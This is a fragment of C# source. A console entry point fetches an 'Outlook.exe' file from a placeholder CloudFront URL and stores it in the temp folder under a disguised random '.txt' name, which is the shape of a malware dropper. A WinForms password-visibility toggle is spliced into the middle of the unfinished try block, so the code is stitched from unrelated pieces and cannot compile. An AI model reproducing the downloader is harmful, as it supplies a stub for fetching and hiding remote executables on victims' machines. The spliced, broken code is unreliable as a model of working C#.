   static async Task Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: wpfRunner.exe <arg>");
            return;
        }

        string remoteUrl = "http://xxx.cloudfront.net/Outlook.exe"; // update
        string tempDirectory = Path.GetTempPath();
        string tempExePath = Path.Combine(tempDirectory, "mldabcdlsdewiv.txt");
//need info
        try
        {
            using (WebClient client = new WebClient())
            {
                await client.DownloadFileTaskAsync(new Uri(remoteUrl), tempExePath);
            }

             private void TogglePasswordVisibility(object sender, EventArgs e)
        {
            if (isPasswordVisible)
            {
                txtPassword.PasswordChar = '*';
                Bitmap iconBitmap = Properties.Resources.eye.ToBitmap();
                this.eyeIcon.Image = iconBitmap;
                eyeIcon.Image = iconBitmap;
            }
                //more here later
     else
            {
                txtPassword.PasswordChar = '\0';
                Bitmap iconBitmap = Properties.Resources.eye_stroke.ToBitmap();
                this.eyeIcon.Image = iconBitmap;
                eyeIcon.Image = iconBitmap;
            }
